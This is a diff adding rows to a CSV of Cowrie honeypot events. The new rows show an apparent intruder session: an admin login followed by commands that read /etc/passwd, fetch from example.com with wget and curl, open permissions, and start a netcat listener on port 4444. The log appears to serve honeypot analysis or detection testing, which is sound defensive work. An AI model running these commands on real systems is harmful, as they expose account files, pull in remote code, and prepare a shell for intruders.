@@ -15,3 +15,11 @@ timestamp,eventid,src_ip,username,input,session
 2026-11-23T18:06:10,cowrie.login.failed,203.0.113.7,admin,,session003
 2026-11-23T18:06:20,cowrie.login.failed,203.0.113.7,root,,session003
 2026-11-23T18:06:30,cowrie.session.closed,203.0.113.7,,,
+2026-11-23T18:09:00,cowrie.session.connect,192.0.2.55,,,session004
+2026-11-23T18:09:10,cowrie.login.success,192.0.2.55,admin,,session004
+2026-11-23T18:09:20,cowrie.command.input,192.0.2.55,admin,cat /etc/passwd,session004
+2026-11-23T18:09:30,cowrie.command.input,192.0.2.55,admin,wget http://example.com/file,session004
+2026-11-23T18:09:40,cowrie.command.input,192.0.2.55,admin,curl http://example.com,session004
+2026-11-23T18:09:50,cowrie.command.input,192.0.2.55,admin,chmod 777 file.txt,session004
+2026-11-23T18:10:00,cowrie.command.input,192.0.2.55,admin,sudo whoami,session004
+2026-11-23T18:10:10,cowrie.command.input,192.0.2.55,admin,nc -lvnp 4444,session004
